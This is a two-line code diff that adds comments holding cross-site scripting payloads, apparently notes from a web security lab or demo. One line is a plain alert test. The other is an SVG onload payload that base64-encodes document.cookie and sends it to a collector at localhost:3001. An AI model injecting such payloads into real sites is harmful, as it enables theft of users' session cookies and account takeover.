@@ -1,0 +1,2 @@
+// PARAM PAYLOAD (<svg onload=alert(1)>)
+// PAYLOAD FOR COOKIE STEAL (<svg onload='var i = new Image(); i.src="http://localhost:3001/acceptCookie?cookie="+btoa(document.cookie);'>)
